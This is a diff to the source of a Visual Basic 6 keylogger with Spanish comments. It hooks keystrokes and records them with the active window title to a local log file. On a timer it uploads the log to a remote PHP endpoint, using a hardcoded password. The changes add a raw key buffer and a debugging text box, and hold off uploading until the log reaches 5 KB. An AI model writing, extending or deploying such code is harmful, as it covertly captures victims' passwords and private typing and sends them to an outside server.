@@ -1,15 +1,22 @@
 VERSION 5.00
 Begin VB.Form FrmMain 
    Caption         =   "Form1"
-   ClientHeight    =   930
+   ClientHeight    =   3300
    ClientLeft      =   60
    ClientTop       =   390
-   ClientWidth     =   1770
+   ClientWidth     =   8400
    LinkTopic       =   "Form1"
-   ScaleHeight     =   930
-   ScaleWidth      =   1770
+   ScaleHeight     =   3300
+   ScaleWidth      =   8400
    StartUpPosition =   3  'Windows Default
-   Visible         =   0   'False
+   Begin VB.TextBox Text1 
+      Height          =   1815
+      Left            =   720
+      TabIndex        =   0
+      Text            =   "Text1"
+      Top             =   840
+      Width           =   6975
+   End
    Begin VB.Timer CanUpload 
       Interval        =   6000
       Left            =   120
@@ -46,6 +53,7 @@ Dim PressedShift As Boolean
 Dim PressedAlt As Boolean
 Dim LastTimePressed As Date
 Dim Buffer As String, CntVbCrlF As Integer
+Dim Buffkeys As String
 Dim VentanaActual As String, CanIreloadCSM As Boolean
 Dim EnviarCada As Integer, cntMinutes As Integer
 
@@ -59,6 +67,7 @@ Private Sub Form_Load()
     UploadUrl = "http://angelbroz.com/ab/k/kloggyx.php"
     MyLogFile = "C:\status.akl"
     EnviarCada = 2
+    UploadKB = 5 'kb
     'Este viene siendo el campo del archvio que recibimos en kloggyx.php
     ServerUploadPassword = "abupload"
     '''''''' </Configurar> '''''''
@@ -129,7 +138,8 @@ Private Sub MyEventRaiser_KBHKeyDown(ByVal vkCode As Integer, ByVal scanCode As 
                 KeyPressed = "[Unknown:" & vkCode & "]"
             End If
     End Select
-    
+    If KeyPressed = "" And Buffer = LineaInicio Then Buffer = ""
+    Buffkeys = Buffkeys & KeyPressed
     Buffer = Buffer & KeyPressed
     
     Dim s As Integer
@@ -152,6 +162,7 @@ exitIf:
     VentanaActual = ActiveWindow
     Exit Sub
 ErrHanlder:
+    On Error Resume Next
     Me.MyEventRaiser.RaiseErrorDetected "Error al recibir el evento KBHKeyDown"
     Err.Clear
 End Sub
@@ -178,6 +189,7 @@ Private Sub MyEventRaiser_ErrorDetected(ByVal ErrStr As String)
         Print #1, tmpString
     Close #1
     Debug.Print tmpString
+    Me.Text1.Text = tmpString
 End Sub
 
 Sub Save()
@@ -208,7 +220,16 @@ Private Sub UploaderTimer_Timer()
     cntMinutes = cntMinutes + 1
     Debug.Print "Minuto " & cntMinutes
     If cntMinutes = EnviarCada Then
+        Dim LenLog As Integer
+        LenLog = FileLen(MyLogFile)
+        LenLog = IIf(LenLog > 0, LenLog / 1024, 0)
+        If LenLog < UploadKB Then
+            Debug.Print "Small log file, wait for grow, " & LenLog & " < " & UploadKB
+            cntMinutes = 0
+            Exit Sub
+        End If
         UploadLogServer
+        Buffkeys = ""
         Debug.Print "Sending logs to the server :o"
         cntMinutes = 0
     End If
